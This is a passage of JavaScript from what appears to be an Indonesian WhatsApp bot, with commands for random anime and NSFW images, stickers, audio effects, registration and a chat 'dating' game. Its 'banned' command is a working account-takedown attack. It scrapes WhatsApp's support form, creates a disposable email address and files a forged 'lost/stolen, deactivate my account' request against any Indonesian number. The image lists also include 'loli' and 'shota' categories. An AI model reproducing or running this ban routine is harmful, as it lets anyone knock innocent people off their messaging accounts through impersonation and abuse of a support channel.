case 'pussy':
case 'tentacles':
case 'thighs':
case 'yuri':
case 'zettai': {
	let enes = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/nsfw/${command}.json`)
	let eswe = pickRandom(enes)
	await Resta.sendMessage(m.sender, { image: { url: eswe }, caption: `Nih ${command}.`})
}
break
//
// RANDOM TEXT GH //
case 'kataanime':
case 'katailham':
case 'faktaunik': {
let tekes = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Random%20Text/${command}.json`)
const tesk = pickRandom(tekes)
await Resta.sendMessage(m.chat, { text: tesk },{quoted:m})
}
break
// RANDOM ANIME //
case 'akira':
case 'akiyama':
case 'ana':
case 'asuna':
case 'ayuzawa':
case 'boruto':
case 'chitanda':
case 'chitoge':
case 'cosplay':
case 'deidara':
case 'doraemon':
case 'elaina':
case 'emilia':
case 'erza':
case 'fanart':
case 'genshin':
case 'gremory':
case 'hestia':
case 'hinata':
case 'husbu':
case 'icon':
case 'isuzu':
case 'itachi':
case 'itori':
case 'kaga':
case 'kagura':
case 'kaguya':
case 'kakashi':
case 'kaori':
case 'kaneki':
case 'keneki':
case 'kosaki':
case 'kotori':
case 'kuriyama':
case 'kuroha':
case 'kurumi':
case 'loli':
case 'madara':
case 'megumin':
case 'menus':
case 'mikasa':
case 'miku':
case 'minato':
case 'natsukawa':
case 'neko':
case 'nekonime':
case 'nezuko':
case 'nishimiya':
case 'onepiece':
case 'pokemon':
case 'rem':
case 'rize':
case 'sagiri':
case 'sakura':
case 'sasuke':
case 'shina':
case 'shinka':
case 'shizuka':
case 'shota':
case 'simp':
case 'tomori':
case 'toukachan':
case 'tsunade':
case 'waifu':
case 'waifu2':
case 'yatogami':
case 'yuki': {
let anim = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Random%20Anime/${command}.json`)
const ainm = pickRandom(anim)
await Resta.sendMessage(m.sender, {image: { url: ainm}, caption: `Nih ${command}\nDASAR WIBU!!!`},)
}
break
// RANDOM IMG GH //
case 'cyberspace':
case 'mountain':
case 'teknologi':
case 'programming': {
let walla = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Wallpaper/${command}.json`)
const wale = pickRandom(walla)
await Resta.sendMessage(m.chat, {image: { url: wale}, caption: `Nih ${command}`},{quoted:m})
}
break
case 'aesthetic':
case 'animerandom':
case 'anjing':
case 'boneka':
case 'darkjokes':
case 'hekel':
case 'justina':
case 'kpop':
case 'kucing':
case 'mobil':
case 'motor':
case 'rose':
case 'ryujin':
case 'wallhp': {
let wallap = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Random%20Image/${command}.json`)
const resut = pickRandom(wallap)
await Resta.sendMessage(m.chat, {image: { url: resut}, caption: `Nih ${command}`},{quoted:m})
}
break
// STICKER GH//
case 'umaru':
case 'mukalu':
case 'animegif':
case 'bucin':
case 'manusialidi':
case 'paimon':
case 'patrickgif':
case 'spongebob':
case 'dinokuning':
case 'among':
case 'rabbit':
case 'random':
case 'patrick':
case 'pentol':
case 'gojo':
case 'gura':
case 'doge': {
let tikel = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Sticker/${command}.json`)
const result = pickRandom(tikel)
    await Resta.sendImageAsSticker(m.chat, result, m, { packname: global.packname, author: global.author })
}
break
case 'banned':{
	if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
	if (!args[0]) {
		return m.reply("No number");
	}
	// replace no numeric
	let text = args[0].replace(/[^0-9]/g, "");
	// Statement if number not INDONESIA number
	if (!(text.startsWith("08") || text.startsWith("62"))) {
		return m.reply("Only INDONESIA number!");
	}

	text = text.startsWith("08") ? text.replace("08", "62") : text;
	if (text + "@s.whatsapp.net" === Resta.user.jid) {
		return m.reply("Is that bot number ?");
	}

	// check number is on whatsapp
	const isValid = await Resta.onWhatsApp(text + "@s.whatsapp.net");
	if (isValid.length == 0) {
		return m.reply("Number not in whatsapp!");
	}

	// text = text.startsWith("62") ? text.replace("62", "") : text;
	text = text.trim();

	try {
		const data = await axios.get("https://www.whatsapp.com/contact/noclient/");
		const email = await axios.get(
			"https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
		);
		const cookie = data.headers["set-cookie"].join("; ");
		const $ = cheerio.load(data.data);
		const $form = $("form");
		const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
		let form = new URLSearchParams();
		form.append("jazoest", $form.find("input[name=jazoest]").val());
		form.append("lsd", $form.find("input[name=lsd]").val());
		form.append("step", "submit");
		form.append("country_selector", "INDONESIA");

		/** @warning
		 * + means it should starts with country code, eg. +62 Xx
		 * miss understanding ?
		 */
		text = PhoneNumber("+" + text).getNumber("international");
		form.append("phone_number", `${text}`);
		/** */

		form.append("email", email.data[0]);
		form.append("email_confirm", email.data[0]);
		form.append("platform", "ANDROID");
		form.append("your_message", "Perdido/roubado: desative minha conta");
		form.append("__user", "0");
		form.append("__a", "1");
		form.append("__csr", "");
		form.append("__req", "8");
		form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
		form.append("dpr", "1");
		form.append("__ccg", "UNKNOWN");
		form.append("__rev", "1006630858");
		form.append("__comment_req", "0");

		const res = await axios({
			url,
			method: "POST",
			data: form,
			headers: {
				cookie,
			},
		});
		const payload = String(res.data);

		if (payload.includes(`"payload":true`)) {
			m.reply(
				`FROM WhatsApp Support
Hai,
Terima kasih atas pesan Anda.
Kami sedang berusaha untuk menonaktifkan akun WhatsApp yang anda kirim.`.trim()
			);
		} else if (payload.includes(`"payload":false`)) {
			m.reply(
				`Terima kasih telah menghubungi kami.
Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`.trim()
			);
		} else m.reply(await import("utils").format(res.data));
	} catch (err) {
		m.reply(`${err}`);
	}
}
break
//----------------//
// OPEN AI //
case 'ai':
case 'openai':
  case 'aii': {
    if (args.length < 1) return m.reply(`Masukkan pertanyaan!\n\n*Contoh:* Siapa presiden Indonesia?`)
    try {
      const { Configuration, OpenAIApi } = require("openai")
      const configuration = new Configuration({
        apiKey: pickRandom(aikey),
      });
      const openai = new OpenAIApi(configuration);
        const response = await openai.createChatCompletion({
                model: "gpt-3.5-turbo",
                messages: [{role: "user", content: text}],
                });
                m.reply(`${response.data.choices[0].message.content}`); 
    } catch(e) {
      try {
         var apii2 = await fetch(`https://mfarels.my.id/api/openai?text=${text}`)
      var js2 = await apii2.json()
      m.reply(js2.result)
      } catch(e) {
        m.reply('Error: Gagal mengambil data dari kedua API.')
      }
    }
  }
    break
case 'serimg': {
if (!q) return m.reply('Masukkan Text')
let ima = await fetchJson(`https://mfarels.my.id/api/openai-image?text=${q}`)
Resta.sendMessage(m.chat, { image: { url: ima.result}, caption: `Nih Hasil Dari Search ${q}`},{quoted:m})
}
break
// ------ //
case 'bc': case 'broadcast': case 'bcall': {
  if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
  if (!text) throw `Text mana?\n\nExample : ${prefix + command} ${global.ownerName}`
  anu = await store.chats.all().map(v => v.id)
  m.reply(mess.wait + '\nMohon Untuk Menunggu Sejenak')
  for (let yoi of anu) {
  await sleep(1500)
  let txt = `*Broadcast ${Resta.user.name}*\n\n${text}`
  Resta.sendText(yoi, txt)
  }
  m.reply('Sukses Broadcast')
  }
            break
   case 'join':  {
              if (!isOwner) return m.reply(mess.botOwner)
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await Resta.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
              break
   case 'get': {
  if (!text) return m.reply('mana linknya')
  let url = new URL(text);  
    let res = await fetch(url);
    let bufg = await getBuffer(text);
    if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
      delete res;
      throw new Error(`Content-Length: ${res.headers.get('content-length')}`);
    }
    if (!/text|json/.test(res.headers.get('content-type'))) return Resta.sendFile(m.chat, bufg,  q, m);
    let txt = await res.text();
    try {
      txt = util.format(JSON.parse(txt+''));
    } catch (e) {
      txt = txt + '';
    } finally {
      m.reply(txt.slice(0, 65536) + '');
    }
}
break
   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await Resta.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                Resta.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
   case 'toqr': case 'qr': {
            	if (!text) throw 'No Query Text'
               m.reply(mess.wait)
               Resta.sendMessage(m.chat, { image: { url: `https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=${text}` }, caption: `Nih Bro` }, { quoted: m })
            	}
            break
            case 'cowner': {
              if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
              if (!args[0]) return m.reply(`Pilih add atau del`)
              if (args[1]) {
              orgnye = args[1]
              } else if (m.quoted) {
              orgnye = m.quoted.sender.split("@")[0]
              }
              const isCwner = owner.includes(orgnye)
              if (args[0] === "add") {
              if (isCwner) return m.reply('User sudah menjadi owner')
              owner.push(orgnye)
              m.reply(`Succes add friends`)
              } else if (args[0] === "del") {
              if (!isCwner) return m.reply('User bukan owner')
              let delcwner = owner.indexOf(orgnye)
              owner.splice(delcwner, 1)
              m.reply(`Succes del friends`)
              } else {
              m.reply("Error")
              }
              }
              break
   case 'menu':
   case 'help': {
   try {
   pporg = await Resta.profilePictureUrl(m.sender, 'image');
   } catch {
   pporg = erorurl
   }
   let ktol = await getBuffer(pporg)
    // create a message for broadcasting
    const fmenu = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          itemCount: `${moment(Date.now()).tz('Asia/Jakarta').locale('id').format('DDMMYYYY')}`,
          status: 200,
          thumbnail: await Resta.reSize(ktol, 100, 100),
          surface: 200,
          message: `Don't forget to follow @Jackss88`,
          orderTitle: 'Tio',
          sellerJid: '0@s.whatsapp.net'
        }
      },
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: 'Don\'t forget to follow @Jackss88',
          body: 'Follow @Jackks88 for more updates',
          mediaType: 2,
          thumbnailUrl: erorurl,
          sourceUrl: 'https://chat.whatsapp.com/FM1On7Kxtrd3ojlkIcOI3b'
        }
      }
    };
    // send the message
  const buttons = [
    {buttonId: 'donasi', buttonText: {displayText: 'DONASI'}, type: 1},
    {buttonId: 'snk', buttonText: {displayText: 'S&K'}, type: 1}
  ];
const tipes = speed();
  const latensiu = speed() - tipes;
  const contextInfo = {
    forwardingScore: 9999,
    isForwarded: false,
    externalAdReply: {
      showAdAttribution: true,
      title: `${ucapanWaktu}, ${pushname} 👋`,
      body: 'Follow @Jacks88 for more updates',
      mediaType: 1,
      thumbnail: ktol,
      sourceUrl: 'https://chat.whatsapp.com/FM1On7Kxtrd3ojlkIcOI3b',
      mediaUrl: 'https://chat.whatsapp.com/FM1On7Kxtrd3ojlkIcOI3b',
      renderLargerThumbnail: true
    }
  };
  // send the text message with the buttons and context info
  await Resta.sendMessage(m.chat, {
    //image: await Resta.reSize(pickRandom(mylogo), 300, 150),
    text: allmenu(prefix, pushname, namaBot, ownerName, runtime, formatp, speed(), speed() - tipes, motiva),
    //buttons: buttons,
    contextInfo: contextInfo,
    //mentions: [m.sender],
    footer: `${namaBot} | By ${ownerName}`
  }, {quoted: m});
}
break;
   case 'donasi': {
              const tgo = '```'
              let domn = `${tgo}Bot ini disediakan secara gratis untuk semua orang dan dapat ditambahkan di dalam sebuah Grup. Namun demikian, jika kamu merasa terbantu dengan penggunaan bot ini dan ingin memberikan kontribusi, donasi akan sangat diapresiasi. Donasi akan membantu pemilik bot untuk menjaga kelangsungan hidupnya dan memastikan bahwa bot tetap berfungsi dengan baik di masa depan. Terima kasih kepada mereka yang telah memberikan donasi kepada bot ini. Mohon dipertimbangkan untuk memberikan kontribusi agar bot ini dapat terus beroperasi dan membantu pengguna dengan lebih baik lagi. Terima kasih :)${tgo}`
              Resta.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/077455dafd3d931bc766e.jpg' }, caption: domn },{quoted:m})
              }
              break
   case 'readme':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              Resta.sendText(m.chat, readme(prefix), m) 
              break
   case 'snk':
              Resta.sendText(m.chat, snk(prefix), m) 
              break
   case 'listchannel':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              Resta.sendText(m.chat, channel(prefix), m) 
              break
   case 'owner':
              Resta.sendContact(m.chat, global.tesel, m)
              break
   case 'afk':
    	      if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              user.afkTime = + new Date
              user.afkReason = text
              Resta.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Telah Afk${text ? ': ' + text : ''}`, m)
              break
    case 'listdm':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              if (args[0] === "1") {
              Resta.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/a4a564eee5b5b9f9b18db.jpg' }, caption: `Minat? Chat Owner`}, {quoted:m})
              Resta.sendContact(m.chat, global.owner, m)
              } else if (args[0] === "2") {
              Resta.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/dbb0f988f88b33d1682d7.jpg' }, caption: `Minat? Chat Owner`}, {quoted:m}) 
              Resta.sendContact(m.chat, global.owner, m)
              }
              break
   case 'verifikasi':
              let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i
              if (user.registered === true) throw m.reply(`Anda sudah terdaftar\nMau daftar ulang? ${prefix}unreg <SN|SERIAL NUMBER>`)
              if (!Reg.test(text)) throw m.reply(`Format salah\n*${prefix}${command} nama.umur*`)
              let [_, name, splitter, age] = text.match(Reg)
              if (!name) throw m.reply( 'Name cannot be empty (Name)')
              if (!age) throw m.reply('Age cant be empty (Number)')
              age = parseInt(age)
              if (age > 80) throw m.reply('Umur terlalu tua 😉')
              if (age < 5) throw m.reply('Babies can type according to the format  ._.')
              user.name = name.trim()
              user.age = age
              user.regTime = + new Date
              user.registered = true
              let sn = createHash('md5').update(m.sender).digest('hex')
              m.reply(`Daftar berhasil!\n\n╭─❒ You Info Registrasi \n├\n├❒ Nama: ${name}\n├❒ Umur: ${age} Tahun \n├\n╰❒〘 ${namaBot} 〙\n\n Jangan Lupa Follow Instagram Mimin ${global.namaBot}\nhttps://instagram.com/Jackks88\n\nNote Serial Number Jangan Sampai Lupa\nSerial Numbernya Sudah Dikirim Bot Di Private Message\nUntuk Menghapus Data Diri Anda Ketik\n${prefix}unreg [ no sn ]`.trim())
              Resta.sendMessage(m.sender, { text: `SERIAL NUMBER / SN\n*${sn}*`})
              break
   case 'unreg':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              if (!args[0]) throw m.reply('Serial Number kosong')
              let spn = createHash('md5').update(m.sender).digest('hex')
              if (args[0] !== spn) throw m.reply('Serial Number salah')
              user.registered = false
              m.reply('```Succes Unreg !```')
              break
   case 'ceksn':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              let Regg = /\|?(.*)([.|] *?)([0-9]*)$/i
              let jp = createHash('md5').update(m.sender).digest('hex')
              Resta.sendMessage(m.sender, { text: `*❒ SN:* ${jp}`})
              break
   case 'tts':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
	          if (args.length < 1) return m.reply('Kirim perintah *#tts [ Bahasa ] [ Teks ]*, contoh *#tts id halo semua*')
	          try {
              const gtts = require('../lib/gtts')(args[0]) 
              if (args.length < 2) return m.reply('Textnya mana gan?') 
              var ngab = body.slice(8)
              ranm = getRandom('.mp3')
              rano = getRandom('.ogg')
              ngab.length > 600 ? reply('Textnya kebanyakan gan') : gtts.save(ranm, ngab, function() {
              exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
              fs.unlinkSync(ranm)
              buff = fs.readFileSync(rano) 
              if (err) return reply('Gagal gan:(')
              Resta.sendMessage(m.chat, {audio: buff, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
              fs.unlinkSync(rano)
              })
              }) 
              } catch (err) {
              console.log(err)
              Resta.sendText(m.chat, bahasa(prefix), m) 
              }
              break
    case 'simi':
		      if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
			  if (!text) throw m.reply(`Penggunaan ${command} text`)
			  var cimcimi = await fetchJson(`https://api.simsimi.net/v2/?text=${text}&lc=id`)
              Resta.sendMessage(m.chat, { text: cimcimi.success}, {quoted: m})
              break
   case 'listblock':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              await Resta.fetchBlocklist().then(async data => {
		      let txt = `*「  Daftar Nomor Yang Diblokir  」*\n\n*Total:* ${data.length}\n\n┌─\n`
		      for (let i of data) {
			  txt += `├ @${i.split("@")[0]}\n`
		      }
		      txt += "└────"
		      return Resta.sendTextWithMentions(m.chat, txt, m)
	          }).catch(err => {
		      console.log(err);
		      m.reply('tidak ada yang diblokir!')
	          })
              break
   case 'litsprivate': {
     	     if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
				 if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
              let abu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
              let tteks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${abu.length} Chat\n\n`
              for (let i of abu) {
              let nama = store.messages[i].array[0].pushName
              tteks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
              }
              Resta.sendTextWithMentions(m.chat, tteks, m)
              }
              break
   case 'litsgroup':
      	    if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
				if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
              let jadin = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
              let tekps = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${jadin.length} Group\n\n`
              for (let i of jadin) {
              let metadata = await Resta.groupMetadata(i)
              tekps += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
              }
              Resta.sendTextWithMentions(m.chat, tekps, m)
              break
   case 'delete': case 'del':
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              if (!m.quoted) throw m.reply('reply pesnya') 
              let { chat, fromMe } = m.quoted
              Resta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
              break
   case 'listonline': case 'liston': 
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
              online = [...Object.keys(store.presences[id]), botNumber]
              Resta.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              break
///converter Link///
     case 'tourl':
               if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               m.reply(mess.wait)
               let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../lib/uploader')
               let mpoedia = await Resta.downloadAndSaveMediaMessage(quoted)
               if (/image/.test(mime)) {
               anu = await TelegraPh(mpoedia)
               m.reply(util.format(anu))
               } else if (!/image/.test(mime)) {
               anu = await UploadFileUgu(mpoedia)
               m.reply(util.format(anu))
               }
               fs.unlinkSync(mpoedia)
              break
    case 'tinyurl':
               if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
               if (args.length < 1) return m.reply(`Penggunaan :\n*${prefix}tinyurl link*`)
               if (!isUrl(args[0])) return m.reply(`Masukkan link yang benar`)
               axios.get(`https://tinyurl.com/api-create.php?url=${args[0]}`)
              .then((a) => m.reply(`Nih ${a.data}`))
              .catch(() => m.reply(`Error, harap masukkan link dengan benar`))
               break
//JADIAN//
   case 'tembakpasangan':
              if(isNaN(text)) {
              number = text.split`@`[1]
              } else if(!isNaN(text)) {
              number = text
              }
              if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
              if (!m.isGroup) return m.reply(mess.group)
              if(!text && !m.quoted) return m.reply(`Masukan nomor, tag target atau balas pesan target`)
              if(isNaN(number)) return m.reply(`_*Nomor tidak valid.*_`)
              if(number.length > 15) return m.reply( `*_Format Tidak Valid.*_`)
              try {
              if(text) {
              user = number + '@s.whatsapp.net'
              } else if(m.quoted.sender) {
              user = m.quoted.sender
              } else if(m.mentionedJid) {
              user = number + '@s.whatsapp.net'
              }  
              } catch (e) {
              } finally {
              let groupMetadata = m.isGroup ? await Resta.groupMetadata(m.chat) : {}
              let participants = m.isGroup ? groupMetadata.participants : []
              let users = m.isGroup ? participants.find(u => u.id == user) : {}
              if(!users) return m.reply(`*_Target atau Nomor tidak ditemukan, mungkin sudah keluar atau bukan anggota grup ini.*_`)
              if(user === m.sender) return m.reply(`_*Tidak bisa berpacaran dengan diri sendiri.*_`)
              if(user === Resta.user.id) return m.reply( `_*Tidak bisa berpacaran dengan saya. :')*_`)
              if (typeof global.db.data.users[user] == "undefined") return m.reply("_*Orang yang anda tag tidak terdaftar di dalam database.*_")  
              if(global.db.data.users[m.sender].pasangan != "" && global.db.data.users[global.db.data.users[m.sender].pasangan].pasangan == m.sender && global.db.data.users[m.sender].pasangan != user){
              Resta.sendTextWithMentions(m.chat,`Kamu sudah berpacaran dengan @${global.db.data.users[m.sender].pasangan.split('@')[0]}\n\nSilahkan putus dulu (ketik .putuspasangan untuk memutuskan hubungan) untuk menembak @${user.split('@')[0]}\n\nBtw yang setia dikit banget!`,m,{contextInfo: {mentionedJid: [user,global.db.data.users[m.sender].pasangan]}})
              }else if(global.db.data.users[user].pasangan != ""){
              var pacar = global.db.data.users[user].pasangan
              if (global.db.data.users[pacar].pasangan == user){
              if (m.sender == pacar && global.db.data.users[m.sender].pasangan == user) return Resta.sendText(m.chat,`Anda sudah berpacaran dengan @${pacar.split('@')[0]}`,m,{contextInfo: {mentionedJid: [pacar]}})
              Resta.sendTextWithMentions(m.chat,`Maaf, @${user.split('@')[0]} sudah berpacaran dengan @${pacar.split('@')[0]}\nSilahkan cari pasangan lain!`,m,{contextInfo:{ mentionedJid: [user,pacar]}})
              }else{
              global.db.data.users[m.sender].pasangan = user
              Resta.sendTextWithMentions(m.chat,`Anda baru saja mengajak @${user.split('@')[0]} berpacaran\n\nSilahkan menunggu jawaban darinya!\n\nKetik *${prefix}terimapasangan @user* untuk menerima\n*${prefix}tolakpasangan @user untuk menolak*`,m,{contextInfo: {mentionedJid: [user]}})
              }
              }else if (global.db.data.users[user].pasangan == m.sender){
              global.db.data.users[m.sender].pasangan = user
              Resta.sendTextWithMentions(m.chat,`Selamat anda resmi berpacaran dengan @${user.split('@')[0]}\n\nSemoga langgeng dan bahagia selalu 😉`,m,{contextInfo: {mentionedJid: [user] }})
              }else {
              global.db.data.users[m.sender].pasangan = user
              Resta.sendTextWithMentions(m.chat,`Kamu baru saja mengajak @${user.split('@')[0]} berpacaran\n\nSilahkan menunggu jawaban darinya!\n\nKetik *${prefix}terimapasangan @user* untuk menerima\n*${prefix}tolakpasangan @user untuk menolak*`,m,{contextInfo: {mentionedJid: [user]}})
              }
              }
              break
   case 'terimapasangan':
              if(isNaN(text)) {
              number = text.split`@`[1]
              } else if(!isNaN(text)) {
              number = text
              }
             const format = num => {
             const n = String(num),
             p = n.indexOf('.')
             return n.replace(/\d(?=(?:\d{3})+(?:\.|$))/g, (m, i) => p < 0 || i < p ? `${m},` : m)
             }
             if (!m.isGroup) return m.reply(mess.group)
             if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
             if(!text && !m.quoted) return m.reply(`Masukan nomor, tag target atau balas pesan target`)
             if(isNaN(number)) return m.reply( `_*Nomor tidak valid.*_`)
             if(number.length > 15) return m.reply( `*_Format Tidak Valid.*_`)
             try {
             if(text) {
             user = number + '@s.whatsapp.net'
             } else if(m.quoted.sender) {
             user = m.quoted.sender
             } else if(m.mentionedJid) {
             user = number + '@s.whatsapp.net'
             }  
             } catch (e) {
             } finally {
             let groupMetadata = m.isGroup ? await Resta.groupMetadata(m.chat) : {}
             let participants = m.isGroup ? groupMetadata.participants : []
             let users = m.isGroup ? participants.find(u => u.jid == user) : {}
             if(users) return m.reply(`*_Target atau Nomor tidak ditemukan, mungkin sudah keluar atau bukan anggota grup ini.*_`)
             if(user === m.sender) return m.reply(`_*Tidak bisa berpacaran dengan diri sendiri.*_`)
             if(user === Resta.user.jid) return m.reply(`_*Tidak bisa berpacaran dengan saya. :')*_`)
             if (typeof global.db.data.users[user] == "undefined") return m.reply("_*Orang yang anda tag tidak terdaftar di dalam database.*_")   
             if(global.db.data.users[user].pasangan != m.sender){
             Resta.sendTextWithMentions(m.chat,`Maaf @${user.split('@')[0]} tidak sedang menembak anda`,m,{contextInfo: {mentionedJid: [user]}})
             }else{
             global.db.data.users[m.sender].pasangan = user
             Resta.sendTextWithMentions(m.chat,`Selamat anda resmi berpacaran dengan @${user.split('@')[0]}\n\nSemoga langgeng dan bahagia selalu @${user.split('@')[0]}  ❤️ @${m.sender.split('@')[0]} 😉`,m,{contextInfo:{ mentionedJid: [m.sender,user]}})
             }
             }	
             break
  case 'cekpasangan':
             if(isNaN(text)) {
             number = text.split`@`[1]
             } else if(!isNaN(text)) {
             number = text
             }
             if(number.length > 15 || (number.length < 9 && number.length > 0)) return m.reply(`Maaf, Nomor yang anda masukan salah!`)
             if (!text && !m.quoted){
             user = m.sender
             orang = "Kamu"
             }else if(text) {
             user = number + '@s.whatsapp.net'
             orang = "Orang yang kamu tag"
             } else if(m.quoted.sender) {
             user = m.quoted.sender
             orang = "Orang yang kamu balas"
             } else if(m.mentionedJid) {
             user = number + '@s.whatsapp.net'
             orang = "Orang yang kamu tag"
             }
             if (typeof global.db.data.users[user] == "undefined"){
             return m.reply("Target tidak terdaftar di dalam database!")
             }
             if (typeof global.db.data.users[global.db.data.users[user].pasangan] == "undefined" && global.db.data.users[user].pasangan != ""){
             return m.reply("Target tidak terdaftar di dalam database!")
             }
             if (global.db.data.users[user].pasangan == "") {
             Resta.sendTextWithMentions(m.chat, `${orang} tidak memiliki pasangan dan tidak sedang menembak siapapun\n\n*Ketik .tembakpasangan @user untuk menembak seseorang*`, m)
             }else if (global.db.data.users[global.db.data.users[user].pasangan].pasangan != user){
             Resta.sendTextWithMentions(m.chat, `${orang} sedang menunggu jawaban dari @${global.db.data.users[user].pasangan.split('@')[0]} karena sedang tidak diterima atau di tolak\n\nKetik *${prefix}ikhlasinpasangan* untuk mengikhlaskan!`, m,{contextInfo: { mentionedJid: [global.db.data.users[user].pasangan]}})
             }else {
             Resta.sendTextWithMentions(m.chat, `${orang} sedang menjalani hubungan dengan @${global.db.data.users[user].pasangan.split('@')[0]} ❤️`, m,{contextInfo: { mentionedJid: [global.db.data.users[user].pasangan]}})
             }
             break
  case 'putuspasangan':
             if (!db.data.users[m.sender].registered) return m.reply(mess.regis)
             ayg = global.db.data.users[m.sender]
             if(ayg.pasangan == ""){
             return m.reply(`Anda tidak memiliki pasangan.`)
             } 
             pacar = global.db.data.users[global.db.data.users[m.sender].pasangan]
             if (typeof pacar == "undefined"){
             Resta.sendTextWithMentions(m.chat,`Berhasil putus hubungan dengan @${global.db.data.users[m.sender].pasangan.split('@')[0]}`,m,{contextInfo: {mentionedJid: [global.db.data.users[m.sender].pasangan]}})
             ayg.pasangan = ""
             }
             if (m.sender == pacar.pasangan){
             Resta.sendTextWithMentions(m.chat,`Berhasil putus hubungan dengan @${global.db.data.users[m.sender].pasangan.split('@')[0]}`,m,{contextInfo: {mentionedJid: [global.db.data.users[m.sender].pasangan]}})
             ayg.pasangan = ""
             pacar.pasangan = ""
             }else {
             m.reply(`Anda tidak memiliki pasangan.`)
             }
             break
